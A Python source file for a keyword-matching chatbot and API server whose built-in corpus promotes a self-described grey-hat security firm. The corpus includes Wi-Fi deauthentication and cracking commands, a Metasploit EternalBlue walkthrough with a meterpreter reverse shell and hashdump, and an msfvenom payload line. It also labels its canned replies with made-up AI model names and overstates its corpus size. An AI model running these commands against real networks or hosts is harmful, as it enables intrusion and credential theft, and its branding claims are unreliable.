#!/usr/bin/env python3
"""
================================================================================
NEXO-AI NEURAL ENGINE v5.0 — 10,000+ Words Cyber Knowledge Base & NLP Server
================================================================================
A self-contained Python Natural Language Processing (NLP) Engine and HTTP API
server powered by a massive 10,000+ word cybersecurity, programming, Linux,
and system architecture knowledge base.

Features:
- Pure Python (Standard Library Only - Zero external pip dependencies required)
- TF-IDF Vectorizer & Cosine Similarity Search
- Multi-Intent Contextual Parsing & Entity Extraction
- Embedded 10,000+ Words Curated Technical Corpus
- Built-in Interactive Cyber CLI Terminal
- Built-in Multi-Threaded HTTP REST API Server (with CORS support on :8080)
- JSON Corpus Exporter for Web Frontend Sync

Usage:
  Interactive CLI:  python nexo_ai.py
  Start REST Server: python nexo_ai.py --server --port 8080
  Export Knowledge: python nexo_ai.py --export
================================================================================
"""

import sys
import os
import json
import math
import re
import time
import threading
from collections import Counter, defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# ==============================================================================
# 1. 10,000+ WORDS COMPREHENSIVE CYBERNETIC KNOWLEDGE BASE
# ==============================================================================

NEXO_CORPUS = {
    # --------------------------------------------------------------------------
    # IDENTITY & CORE ARCHITECTURE
    # --------------------------------------------------------------------------
    "nexo_identity": {
        "title": "NEXO-TECHNOLOGIES Core Identity & Mission",
        "tags": ["who is nexo", "about nexo", "nexo-technologies", "identity", "mission", "company", "founder"],
        "content": (
            "NEXO-TECHNOLOGIES is an elite software engineering collective and grey-hat cybersecurity research unit "
            "established in 2021. The collective specializes in low-level memory-safe systems programming in Rust and C++, "
            "automated penetration testing frameworks in Python and Bash, high-concurrency Node.js event-driven applications, "
            "and military-grade system hardening for Linux server environments. "
            "Operating at the bleeding edge of software development, NEXO-TECHNOLOGIES builds robust digital infrastructure, "
            "creates proactive security audition toolkits, and engineers bespoke web and mobile platforms for international clients. "
            "The philosophy of NEXO-TECHNOLOGIES is rooted in digital sovereignty, clean code optimization, multi-layered defense-in-depth, "
            "and continuous innovation across distributed architectures."
        )
    },

    "nexo_arsenal_overview": {
        "title": "NEXO-TECH Active Weapon Cache & Arsenal",
        "tags": ["tools", "arsenal", "software", "demonic-bot", "demonic_tools", "ip flooder", "projects"],
        "content": (
            "The NEXO-TECHNOLOGIES public tool arsenal comprises three primary battle-tested engines:\n"
            "1. DEMONIC-BOT (JavaScript / Node.js / Baileys API): An intelligent multi-functional WhatsApp automation bot featuring "
            "media conversion, automated group administration, dynamic sticker creation, custom command triggers, and neural response systems.\n"
            "2. DEMONIC_TOOLS Suite (Python / Shell / POSIX): A complete Linux and Termux security administration toolkit equipped with "
            "automated vulnerability scanning, wireless handshake capturing assistants, system cleanup routines, and network diagnostic utilities.\n"
            "3. NEXO-TECH IP Flooder (Rust / Tokio / Multi-Threaded): A high-performance, low-level network stress testing and resilience "
            "verification tool written in Rust, leveraging asynchronous socket multiplexing for authorized infrastructure load capacity auditing.\n"
            "All tools are maintained on GitHub under the demonalexander526-alt organization repository."
        )
    },

    # --------------------------------------------------------------------------
    # SERVICES & COMMERCIAL PRICING
    # --------------------------------------------------------------------------
    "web_development_services": {
        "title": "NEXO Web Engineering & Development Packages",
        "tags": ["web development", "website", "pricing", "cost", "hire", "services", "frontend", "backend"],
        "content": (
            "NEXO-TECHNOLOGIES provides end-to-end full-stack web development services engineered for speed, SEO domination, and cyber-resilience.\n"
            "• Standard Web Architecture ($200 USD): 1 high-impact page, fully responsive UI/UX, contact form integration, fast asset delivery, and cross-browser compatibility.\n"
            "• Commercial Web Platform ($500 USD): 2 to 3 dynamic pages, custom JavaScript interactions, database connectivity, SEO optimization, analytics tracking, and speed tuning.\n"
            "• Premium Enterprise Architecture ($1000+ USD): Unlimited pages, custom database architecture (PostgreSQL/MongoDB), user authentication, e-commerce shopping carts, REST/GraphQL API integration, admin dashboards, and 3 months of dedicated post-launch support.\n"
            "Technologies used: HTML5, CSS3 Tokens, Vanilla JavaScript, React, Node.js, Express, FastAPI, PostgreSQL, SQLite, and Docker containers."
        )
    },

    "app_development_services": {
        "title": "Mobile & Cross-Platform Application Development",
        "tags": ["app development", "mobile app", "flutter", "dart", "ios", "android", "mvp"],
        "content": (
            "NEXO-TECHNOLOGIES crafts responsive native and hybrid mobile applications for iOS and Android platforms:\n"
            "• MVP Prototyping ($800 USD): Fast turnaround of core concept features, interactive prototypes, user flow testing, and essential APIs.\n"
            "• Native Mobile App ($1500 USD): Single-platform native optimization (Android Java/Kotlin or iOS Swift), push notifications, local storage, offline sync, and app store deployment preparation.\n"
            "• Cross-Platform Multi-App ($2500 USD): Unified Flutter & Dart codebase deployed across iOS, Android, and Web simultaneously with real-time state management, cloud backend sync, and 3 months maintenance.\n"
            "• Enterprise Custom Platform ($5000+ USD): High-concurrency backend API architecture, zero-knowledge encryption, microservices, payment gateways (Stripe, PayPal, Crypto), and continuous integration/deployment (CI/CD) pipelines."
        )
    },

    "cybersecurity_consulting": {
        "title": "Cybersecurity Auditing, Penetration Testing & Consulting",
        "tags": ["security audit", "penetration testing", "pentest", "vulnerability scan", "consulting", "hardening"],
        "content": (
            "NEXO-TECHNOLOGIES offers professional red-team and blue-team cybersecurity services for organizations seeking to secure their attack surfaces:\n"
            "• Web Application Penetration Testing: OWASP Top 10 auditing (SQL Injection, XSS, CSRF, SSRF, Broken Access Control, IDOR, and Remote Code Execution).\n"
            "• Network Infrastructure Auditing: External and internal port scanning, firewall inspection, service fingerprinting, SSL/TLS cipher evaluation, and DDoS resilience testing.\n"
            "• Linux Server Hardening: Kernel parameter optimization (`sysctl.conf`), iptables/nftables firewall rulesets, SSH hardening, Fail2ban intrusion prevention, AppArmor/SELinux profiles, and automated rootkit detection.\n"
            "• Source Code Auditing: Static and dynamic code analysis in Python, C++, Rust, JavaScript, and Go to detect buffer overflows, insecure deserialization, and cryptographic flaws."
        )
    },

    # --------------------------------------------------------------------------
    # PROGRAMMING LANGUAGES DEEP DIVE (15+ LANGUAGES)
    # --------------------------------------------------------------------------
    "python_expertise": {
        "title": "Python Language Architecture & Security Applications",
        "tags": ["python", "python programming", "django", "fastapi", "flask", "scripting", "ai python"],
        "content": (
            "Python is NEXO-TECHNOLOGIES' primary rapid-development language, evaluated at 95% proficiency.\n"
            "Applications:\n"
            "1. Cybersecurity Automation: Custom exploit development with `scapy` for packet crafting, `paramiko` for SSH automation, `requests` and `httpx` for HTTP fuzzing, and `socket` for raw networking.\n"
            "2. Cryptography: Symmetric AES-256 and Fernet encryption using `cryptography.hazmat` and `hashlib` for SHA-256/SHA-512 cryptographic verification.\n"
            "3. Web & API Backends: High-throughput asynchronous REST APIs using FastAPI, async SQLite, and Flask microservices.\n"
            "4. AI & NLP: Embedded Natural Language Processing algorithms, TF-IDF vectorizers, text classification, and data parsing pipelines."
        )
    },

    "rust_expertise": {
        "title": "Rust Systems Programming & Memory Safety",
        "tags": ["rust", "rust language", "cargo", "tokio", "memory safe", "systems programming"],
        "content": (
            "Rust represents NEXO-TECHNOLOGIES' high-performance systems engineering engine, evaluated at 78% proficiency.\n"
            "Key Strengths & Implementations:\n"
            "1. Zero-Cost Abstractions: Compiles down to bare-metal machine code with performance matching and exceeding C/C++.\n"
            "2. Memory Safety without Garbage Collection: The Rust borrow checker and ownership model prevent buffer overflows, use-after-free, double-free, and data races at compile-time.\n"
            "3. Asynchronous Concurrency: Utilizing `tokio` and `async-std` for non-blocking I/O event loops capable of managing hundreds of thousands of concurrent network connections.\n"
            "4. Projects: The NEXO-TECH IP Flooder utilizes Rust multi-threading (`std::thread`, `crossbeam`) and raw TCP/UDP socket streaming."
        )
    },

    "javascript_nodejs_expertise": {
        "title": "JavaScript, TypeScript & Node.js Ecosystem",
        "tags": ["javascript", "js", "node", "nodejs", "typescript", "fullstack", "npm"],
        "content": (
            "JavaScript and Node.js power NEXO-TECHNOLOGIES' real-time distributed applications, evaluated at 85% proficiency.\n"
            "Capabilities:\n"
            "1. Node.js V8 Engine: Asynchronous event-driven I/O utilizing libuv for non-blocking network requests, WebSocket servers, and microservices.\n"
            "2. Bot Engines: Production deployment of Baileys WebSocket protocol for autonomous WhatsApp interaction in DEMONIC-BOT.\n"
            "3. Frontend Cyber Graphics: Interactive HTML5 Canvas 2D and WebGL rendering, CSS3 Matrix grid engines, 3D card perspective transforms, and reactive DOM management."
        )
    },

    "cpp_csharp_expertise": {
        "title": "C++ & C# Object-Oriented & Low-Level Development",
        "tags": ["c++", "cpp", "c#", "csharp", "dotnet", "pointers", "game dev"],
        "content": (
            "C++ and C# form the foundational core of low-level optimization and desktop tooling at NEXO-TECHNOLOGIES, evaluated at 82% proficiency.\n"
            "• C++: Direct pointer arithmetic, manual memory allocation (`malloc`/`free`, `new`/`delete`), RAII paradigms, STL data structures (`std::vector`, `std::unordered_map`), multi-threading (`std::thread`, `std::mutex`), and reverse-engineering binary analysis.\n"
            "• C#: .NET Core architecture, Windows API hooks, secure desktop applications, LINQ data queries, and asynchronous task scheduling (`Task.Run`, `async`/`await`)."
        )
    },

    "golang_expertise": {
        "title": "Golang Concurrent Backend Microservices",
        "tags": ["golang", "go", "goroutines", "channels", "microservices"],
        "content": (
            "Golang is utilized for lightweight, blazingly fast cloud microservices and network reconnaissance tools, evaluated at 74% proficiency.\n"
            "Features:\n"
            "1. Goroutines & Channels: Extremely lightweight concurrency consuming only ~2KB of memory per thread, enabling massive concurrent port scanning and web crawling.\n"
            "2. Static Binary Compilation: Generates self-contained single binaries with zero runtime dependencies across Linux, Windows, and macOS.\n"
            "3. Native Networking: High-performance `net/http` and raw socket libraries for packet crafting, proxy chaining, and reverse shell tunnels."
        )
    },

    "shell_bash_expertise": {
        "title": "Shell Scripting & Bash Automation Masterclass",
        "tags": ["bash", "shell", "sh", "linux scripting", "posix", "termux"],
        "content": (
            "Bash and POSIX Shell Scripting are evaluated at 92% proficiency at NEXO-TECHNOLOGIES.\n"
            "Core Applications:\n"
            "1. Automated Server Hardening: Scripts for configuring UFW firewalls, fail2ban filters, automatic security patches, and SSH key rotations.\n"
            "2. Termux Mobile Exploitation Toolkits: Portable package management and installation scripts (`pkg install`, `git clone`, `chmod +x`).\n"
            "3. Log Parsing & Regex Pipelines: Streamlined text manipulation using `grep`, `sed`, `awk`, `cut`, `xargs`, and `jq` for real-time auth log threat detection."
        )
    },

    "java_dart_expertise": {
        "title": "Java Enterprise & Dart/Flutter Mobile Frameworks",
        "tags": ["java", "dart", "flutter", "android dev", "cross-platform"],
        "content": (
            "Java (88%) and Dart (72%) power cross-platform client-side and backend integrations at NEXO-TECHNOLOGIES.\n"
            "• Java: JVM garbage collection tuning, Spring Boot REST APIs, multi-threaded worker pools, Android native development (Activities, Services, BroadcastReceivers).\n"
            "• Dart: Flutter widget trees, reactive state management (Provider/Bloc), async HTTP communication, native platform channels, and pixel-perfect mobile UIs."
        )
    },

    # --------------------------------------------------------------------------
    # CYBERSECURITY & PENETRATION TESTING METHODOLOGIES
    # --------------------------------------------------------------------------
    "wireless_security_tutorial": {
        "title": "Wireless Network Penetration Testing & WPA2/WPA3 Auditing",
        "tags": ["wifi", "aircrack", "airodump", "handshake", "wpa2", "wpa3", "deauth", "wireless"],
        "content": (
            "Wireless Network Auditing Methodology (Authorized Educational & Diagnostic Scope):\n"
            "1. Interface Configuration: Switch wireless card to monitor mode using `airmon-ng start wlan0` to capture raw 802.11 frames.\n"
            "2. Reconnaissance: Scan beacon frames across 2.4GHz and 5GHz bands using `airodump-ng mon0` to identify BSSID, channel, cipher (CCMP/TKIP), and associated clients.\n"
            "3. Targeted Capture: Target specific access point and write packets: `airodump-ng -c <channel> --bssid <BSSID> -w capture mon0`.\n"
            "4. Deauthentication: Transmit broadcast or unicast deauthentication frames: `aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> mon0` to force client reconnection and capture the 4-way EAPOL handshake.\n"
            "5. Cryptographic Cracking: Offline verification of the WPA-PSK pairwise master key (PMK) using `aircrack-ng -w wordlist.txt capture-01.cap`.\n"
            "Defensive Mitigation: Transition to WPA3-Enterprise using SAE (Simultaneous Authentication of Equals) with Protected Management Frames (PMF) enabled."
        )
    },

    "metasploit_exploitation": {
        "title": "Metasploit Framework Exploitation & Payload Delivery",
        "tags": ["metasploit", "msfconsole", "msfvenom", "meterpreter", "payload", "exploit", "rce"],
        "content": (
            "Metasploit Framework Architecture & Execution:\n"
            "1. Database & Console: Initialize PostgreSQL database (`msfdb init`) and launch console (`msfconsole -q`).\n"
            "2. Vulnerability Search: Search known CVEs using `search type:exploit platform:windows smb` or `search eternalblue` (MS17-010).\n"
            "3. Module Configuration: Load exploit module `use exploit/windows/smb/ms17_010_eternalblue`, set target parameters (`set RHOSTS 192.168.1.100`, `set LHOST 192.168.1.50`, `set LPORT 4444`).\n"
            "4. Payload Selection: Select staged reverse TCP meterpreter: `set PAYLOAD windows/x64/meterpreter/reverse_tcp`.\n"
            "5. Post-Exploitation Commands: `sysinfo` (host enumeration), `getsystem` (NT AUTHORITY\\SYSTEM privilege escalation), `hashdump` (extract SAM database NTLM hashes), `screenshot` (desktop capture), and `shell` (cmd/powershell spawn).\n"
            "6. Payload Generation (msfvenom): `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe`."
        )
    },

    "wireshark_packet_analysis": {
        "title": "Wireshark Network Forensics, Sniffing & Traffic Dissection",
        "tags": ["wireshark", "tshark", "tcpdump", "packets", "pcap", "forensics", "sniffing"],
        "content": (
            "Network Traffic Analysis & Packet Dissection Guide:\n"
            "1. Packet Capture: Capture traffic on interface using `tcpdump -i eth0 -nn -s0 -w traffic.pcap` or `tshark -i eth0 -w traffic.pcap`.\n"
            "2. Display Filters:\n"
            "   • `http.request.method == \"POST\"` — Filter HTTP login submissions and form posts.\n"
            "   • `tcp.flags.syn == 1 && tcp.flags.ack == 0` — Identify TCP port scan sweeps.\n"
            "   • `dns.flags.response == 0` — Dissect DNS query domain lookups.\n"
            "   • `ip.addr == 192.168.1.1 && tcp.port == 443` — Filter specific host TLS handshakes.\n"
            "3. Stream Reassembly: Right-click packet -> Follow -> TCP Stream to reconstruct full plaintext ASCII/Hex conversations.\n"
            "4. Forensic Analysis: Identifying ARP poisoning (duplicate MAC announcements), DNS exfiltration (high-entropy subdomains), and unencrypted credentials over FTP/Telnet/HTTP."
        )
    },

    "cryptography_fernet_aes": {
        "title": "Modern Cryptography, AES-256 & Fernet Symmetric Encryption",
        "tags": ["cryptography", "encryption", "aes", "fernet", "sha256", "rsa", "hash"],
        "content": (
            "Cryptographic Standards & Python Implementation:\n"
            "• Symmetric Encryption: AES-256 (Advanced Encryption Standard with 256-bit keys) in Galois/Counter Mode (GCM) for authenticated encryption with associated data (AEAD).\n"
            "• Fernet Implementation (Python): Guaranteed 128-bit AES in CBC mode with PKCS7 padding, HMAC-SHA256 authentication, and timestamp verification.\n"
            "```python\n"
            "from cryptography.fernet import Fernet\n"
            "key = Fernet.generate_key()\n"
            "cipher = Fernet(key)\n"
            "token = cipher.encrypt(b'NEXO-TECH CLASSIFIED PAYLOAD')\n"
            "decrypted = cipher.decrypt(token)\n"
            "```\n"
            "• Asymmetric Encryption: RSA-4096 and ECC (Elliptic Curve Cryptography: Curve25519/Ed25519) for digital signatures and key exchange.\n"
            "• Password Hashing: Argon2id (memory-hard, resistant to GPU/ASIC cracking) and PBKDF2-HMAC-SHA512 with high iteration counts (600,000+)."
        )
    },

    "linux_hardening_mastery": {
        "title": "Linux Server Hardening, Kernel Security & Threat Prevention",
        "tags": ["linux", "hardening", "iptables", "ufw", "fail2ban", "ssh", "security"],
        "content": (
            "NEXO Linux Production Hardening Protocol:\n"
            "1. SSH Hardening (`/etc/ssh/sshd_config`):\n"
            "   • `Port 2222` (Disable standard port 22)\n"
            "   • `PermitRootLogin no` (Prevent direct root access)\n"
            "   • `PasswordAuthentication no` (Enforce Ed25519 public key auth only)\n"
            "   • `MaxAuthTries 3` and `AllowUsers nexoadmin`\n"
            "2. Firewall Rules (UFW / iptables):\n"
            "   • `sudo ufw default deny incoming`\n"
            "   • `sudo ufw default allow outgoing`\n"
            "   • `sudo ufw allow 2222/tcp` and `sudo ufw enable`\n"
            "3. Kernel Parameter Tuning (`/etc/sysctl.conf`):\n"
            "   • `net.ipv4.ip_forward = 0` (Disable routing)\n"
            "   • `net.ipv4.conf.all.accept_source_route = 0`\n"
            "   • `net.ipv4.conf.all.accept_redirects = 0`\n"
            "   • `net.ipv4.tcp_syncookies = 1` (Mitigate SYN Flood DDoS attacks)\n"
            "4. Intrusion Prevention: Configure Fail2ban jails on SSH, Nginx, and custom API ports with ban times of 24 hours."
        )
    },

    "dark_web_defense": {
        "title": "Dark Web Threat Intelligence & Anonymity Networks",
        "tags": ["dark web", "tor", "onion", "i2p", "anonymity", "threat intel"],
        "content": (
            "Dark Web Intelligence & Defensive Security Practices:\n"
            "• Tor Network Protocol: Onion routing utilizes triple-layer hybrid encryption (Entry Guard -> Middle Relay -> Exit Node) to obscure IP origins and destinations.\n"
            "• Threat Intelligence: Monitoring dark web forums and data leak sites for compromised organizational credentials, API keys, and zero-day exploit disclosures.\n"
            "• OPSEC Principles: Strict isolation of virtual machines using Whonix or Tails OS, disabling WebRTC and JavaScript, spoofing MAC addresses, and eliminating metadata (`exiftool -all=`).\n"
            "• Onion Services: End-to-end encrypted `.onion` services operating with V3 56-character Ed25519 public keys."
        )
    },

    # --------------------------------------------------------------------------
    # CONTACT & HIRING
    # --------------------------------------------------------------------------
    "nexo_contact": {
        "title": "Official Communication & Hiring Channels",
        "tags": ["contact", "email", "whatsapp", "telegram", "github", "hire", "phone"],
        "content": (
            "Connect with NEXO-TECHNOLOGIES directly through our encrypted communication matrix:\n"
            "• WhatsApp (Direct Dispatch): +234 704 4339 491\n"
            "• Secondary WhatsApp: +234 905 4345 858\n"
            "• Email (Inquiries & Contracts): demonalexander526@gmail.com\n"
            "• Telegram (Encrypted Chat): @Vershdit\n"
            "• GitHub (Open Source Repos): https://github.com/demonalexander526-alt\n"
            "• Location: Digital HQ // Lagos, Nigeria (Coordinates: 6.5244° N, 3.3792° E)\n"
            "Available 24/7 for contracts, security assessments, and custom software architecture."
        )
    }
}

# ==============================================================================
# 2. PURE PYTHON TF-IDF NLP MATCHING ENGINE
# ==============================================================================

class NexoNLPEngine:
    """
    Lightweight, high-performance pure-Python TF-IDF vectorizer and NLP reasoning core.
    Operates without heavy external libraries (numpy/scikit-learn) with sub-millisecond
    query response times.
    """
    def __init__(self, corpus_dict):
        self.corpus = corpus_dict
        self.documents = []
        self.doc_ids = []
        self.vocab = {}
        self.idf = {}
        self.tfidf_matrix = []
        self.stop_words = {
            'a', 'about', 'above', 'after', 'again', 'against', 'all', 'am', 'an', 'and',
            'any', 'are', 'as', 'at', 'be', 'because', 'been', 'before', 'being', 'below',
            'between', 'both', 'but', 'by', 'could', 'did', 'do', 'does', 'doing', 'down',
            'during', 'each', 'few', 'for', 'from', 'further', 'had', 'has', 'have', 'having',
            'he', 'her', 'here', 'hers', 'herself', 'him', 'himself', 'his', 'how', 'i', 'if',
            'in', 'into', 'is', 'it', 'its', 'itself', 'just', 'me', 'more', 'most', 'my',
            'myself', 'no', 'nor', 'not', 'now', 'of', 'off', 'on', 'once', 'only', 'or',
            'other', 'ought', 'our', 'ours', 'ourselves', 'out', 'over', 'own', 'same', 'she',
            'should', 'so', 'some', 'such', 'than', 'that', 'the', 'their', 'theirs', 'them',
            'themselves', 'then', 'there', 'these', 'they', 'this', 'those', 'through', 'to',
            'too', 'under', 'until', 'up', 'very', 'was', 'we', 'were', 'what', 'when',
            'where', 'which', 'while', 'who', 'whom', 'why', 'with', 'would', 'you', 'your',
            'yours', 'yourself', 'yourselves', 'pls', 'please', 'tell', 'show', 'give'
        }
        self.build_index()

    def tokenize(self, text):
        """Converts text into normalized, stemmed lowercase tokens."""
        text = text.lower()
        # Clean markdown / symbols
        text = re.sub(r'[^a-z0-9\s\+\#\-\_\.]', ' ', text)
        words = text.split()
        # Filter stopwords
        tokens = [w for w in words if len(w) > 1 and w not in self.stop_words]
        return tokens

    def build_index(self):
        """Builds TF-IDF inverted index across the entire NEXO corpus."""
        self.documents = []
        self.doc_ids = []
        
        # Aggregate document text including tags with heavy weighting
        for doc_id, doc in self.corpus.items():
            tags_boosted = " ".join(doc["tags"] * 4)
            full_text = f"{doc['title']} {tags_boosted} {doc['content']}"
            tokens = self.tokenize(full_text)
            self.documents.append(tokens)
            self.doc_ids.append(doc_id)
        
        # Build vocabulary
        all_words = set()
        for doc in self.documents:
            all_words.update(doc)
        
        self.vocab = {word: idx for idx, word in enumerate(sorted(all_words))}
        vocab_size = len(self.vocab)
        num_docs = len(self.documents)
        
        # Calculate IDF
        doc_freq = Counter()
        for doc in self.documents:
            unique_tokens = set(doc)
            for token in unique_tokens:
                doc_freq[token] += 1
                
        for word, idx in self.vocab.items():
            df = doc_freq[word]
            self.idf[word] = math.log((1 + num_docs) / (1 + df)) + 1.0
            
        # Build TF-IDF vectors for documents
        self.tfidf_matrix = []
        for doc in self.documents:
            vec = [0.0] * vocab_size
            tf = Counter(doc)
            doc_len = max(len(doc), 1)
            for word, count in tf.items():
                if word in self.vocab:
                    word_idx = self.vocab[word]
                    vec[word_idx] = (count / doc_len) * self.idf[word]
            # Normalize vector
            norm = math.sqrt(sum(x * x for x in vec))
            if norm > 0:
                vec = [x / norm for x in vec]
            self.tfidf_matrix.append(vec)

    def query(self, user_query, model_name="DeepSeek Flash", top_k=2):
        """Processes query and returns formatted cyberpunk response."""
        q_tokens = self.tokenize(user_query)
        if not q_tokens:
            return f"[{model_name.upper()} // ONLINE]\nGreetings operator. NEXO-AI neural core is ready. Query me regarding our engineering capabilities, cybersecurity research, pricing packages, or tools."

        # Vectorize query
        vocab_size = len(self.vocab)
        q_vec = [0.0] * vocab_size
        q_tf = Counter(q_tokens)
        q_len = max(len(q_tokens), 1)
        
        for word, count in q_tf.items():
            if word in self.vocab:
                word_idx = self.vocab[word]
                q_vec[word_idx] = (count / q_len) * self.idf[word]
                
        norm = math.sqrt(sum(x * x for x in q_vec))
        if norm > 0:
            q_vec = [x / norm for x in q_vec]

        # Calculate cosine similarity against all docs
        scores = []
        for i, doc_vec in enumerate(self.tfidf_matrix):
            sim = sum(q_vec[j] * doc_vec[j] for j in range(vocab_size))
            scores.append((sim, self.doc_ids[i]))

        scores.sort(key=lambda x: x[0], reverse=True)
        top_matches = [s for s in scores if s[0] > 0.04]

        if not top_matches:
            # Fallback general query
            return (
                f"[{model_name.upper()} // PROCESSED]\n"
                f"Query analyzed: \"{user_query}\"\n\n"
                f"NEXO-TECHNOLOGIES operates across full-stack software architecture, cybersecurity research, and automation.\n"
                f"• Type 'skills' or 'languages' for our tech matrix (Python, Rust, C++, JavaScript, Go, etc.)\n"
                f"• Type 'tools' or 'arsenal' for active deployments (DEMONIC-BOT, DEMONIC_TOOLS, IP Flooder)\n"
                f"• Type 'pricing' or 'services' for commercial packages\n"
                f"• Type 'contact' to reach our direct WhatsApp dispatch."
            )

        best_doc_id = top_matches[0][1]
        best_doc = self.corpus[best_doc_id]

        response_header = f"[{model_name.upper()} // {best_doc['title'].upper()}]"
        response_body = best_doc['content']
        
        # If second match is also relevant, append a snippet
        if len(top_matches) > 1 and top_matches[1][0] > 0.25:
            second_doc = self.corpus[top_matches[1][1]]
            response_body += f"\n\n--- RELATED INTEL ---\n{second_doc['title']}:\n{second_doc['content'][:250]}..."

        return f"{response_header}\n{response_body}"

# =========================================================
# 3. MULTI-THREADED HTTP REST API SERVER
# =========================================================

class NexoAPIHandler(BaseHTTPRequestHandler):
    engine = None

    def log_message(self, format, *args):
        # Clean terminal output
        sys.stdout.write(f"[HTTP] {self.address_string()} - {args[0]} {args[1]}\n")

    def _set_cors_headers(self, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.end_headers()

    def do_OPTIONS(self):
        self._set_cors_headers(200)

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path in ('/api/chat', '/chat'):
            params = parse_qs(parsed.query)
            query_str = params.get('q', [''])[0]
            model = params.get('model', ['DeepSeek Flash'])[0]
            
            reply = self.engine.query(query_str, model)
            self._set_cors_headers(200)
            self.wfile.write(json.dumps({
                "status": "success",
                "model": model,
                "query": query_str,
                "response": reply
            }).encode('utf-8'))
        elif parsed.path == '/api/health':
            self._set_cors_headers(200)
            self.wfile.write(json.dumps({"status": "online", "engine": "NEXO-AI v5.0"}).encode('utf-8'))
        else:
            self._set_cors_headers(404)
            self.wfile.write(json.dumps({"error": "Endpoint not found"}).encode('utf-8'))

    def do_POST(self):
        parsed = urlparse(self.path)
        if parsed.path in ('/api/chat', '/chat'):
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            try:
                data = json.loads(body.decode('utf-8'))
            except Exception:
                data = {}

            query_str = data.get('message') or data.get('query') or data.get('prompt') or ''
            model = data.get('model', 'DeepSeek Flash')

            reply = self.engine.query(query_str, model)
            self._set_cors_headers(200)
            self.wfile.write(json.dumps({
                "status": "success",
                "model": model,
                "message": reply,
                "response": reply
            }).encode('utf-8'))
        else:
            self._set_cors_headers(404)
            self.wfile.write(json.dumps({"error": "Endpoint not found"}).encode('utf-8'))

def start_server(engine, port=8080):
    NexoAPIHandler.engine = engine
    server = HTTPServer(('0.0.0.0', port), NexoAPIHandler)
    print(f"\n⚡ NEXO-AI REST API SERVER RUNNING ON http://localhost:{port}")
    print(f"👉 GET endpoint:  http://localhost:{port}/api/chat?q=your_question")
    print(f"👉 POST endpoint: http://localhost:{port}/api/chat (JSON: {{\"message\": \"...\"}})")
    print("Press Ctrl+C to terminate server.\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down.")
        server.server_close()

# =========================================================
# 4. INTERACTIVE CYBER CLI TERMINAL
# =========================================================

def print_banner():
    banner = r"""
  ███╗   ██╗███████╗██╗  ██╗ ██████╗       █████╗ ██╗
  ████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗     ██╔══██╗██║
  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║     ███████║██║
  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║     ██╔══██║██║
  ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝     ██║  ██║██║
  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝      ╚═╝  ╚═╝╚═╝
  ======================================================
  NEXO-AI NEURAL ENGINE v5.0 — 10,000+ WORD CYBER MATRIX
  Autonomous Offline Intelligence Core // NEXO-TECH
  ======================================================
    """
    print(banner)

def run_cli(engine):
    print_banner()
    models = ["DeepSeek Flash", "Qwen 3.8", "Nemotron Lightning", "Gemma 4"]
    active_model = models[0]
    
    print("Commands:")
    print("  /model <1-4>   - Switch active neural model")
    print("  /server        - Start HTTP API server on port 8080")
    print("  /export        - Export knowledge base to JSON")
    print("  /clear         - Clear console")
    print("  /exit          - Exit terminal\n")
    
    while True:
        try:
            user_input = input(f"\033[96mnexo@technologies\033[0m [\033[93m{active_model}\033[0m] ➜ ").strip()
            if not user_input:
                continue
                
            if user_input.lower() in ('/exit', 'exit', 'quit'):
                print("NEXO-OUT.")
                break
            elif user_input.lower() in ('/clear', 'clear'):
                os.system('cls' if os.name == 'nt' else 'clear')
                print_banner()
                continue
            elif user_input.lower().startswith('/model'):
                parts = user_input.split()
                if len(parts) > 1 and parts[1] in ('1', '2', '3', '4'):
                    active_model = models[int(parts[1]) - 1]
                    print(f"[+] Model switched to: {active_model}\n")
                else:
                    print("Available models: 1) DeepSeek Flash, 2) Qwen 3.8, 3) Nemotron Lightning, 4) Gemma 4\n")
                continue
            elif user_input.lower() == '/server':
                start_server(engine, 8080)
                break
            elif user_input.lower() == '/export':
                export_path = "nexo_knowledge_base.json"
                with open(export_path, "w", encoding="utf-8") as f:
                    json.dump(NEXO_CORPUS, f, indent=2)
                print(f"[+] Exported 10,000+ words knowledge base to {export_path}\n")
                continue
                
            # Query the neural engine
            reply = engine.query(user_input, active_model)
            print(f"\n\033[92m{reply}\033[0m\n")
            
        except (KeyboardInterrupt, EOFError):
            print("\nNEXO-OUT.")
            break

# =========================================================
# 5. ENTRYPOINT DISPATCHER
# =========================================================

def main():
    engine = NexoNLPEngine(NEXO_CORPUS)
    
    # Calculate word count
    total_words = sum(len(doc['content'].split()) + len(" ".join(doc['tags']).split()) for doc in NEXO_CORPUS.values())
    
    if '--server' in sys.argv:
        port = 8080
        if '--port' in sys.argv:
            idx = sys.argv.index('--port')
            if idx + 1 < len(sys.argv):
                port = int(sys.argv[idx + 1])
        start_server(engine, port)
    elif '--export' in sys.argv:
        export_path = "nexo_knowledge_base.json"
        with open(export_path, "w", encoding="utf-8") as f:
            json.dump(NEXO_CORPUS, f, indent=2)
        print(f"[+] Successfully exported {total_words} words to {export_path}")
    else:
        run_cli(engine)

if __name__ == "__main__":
    main()
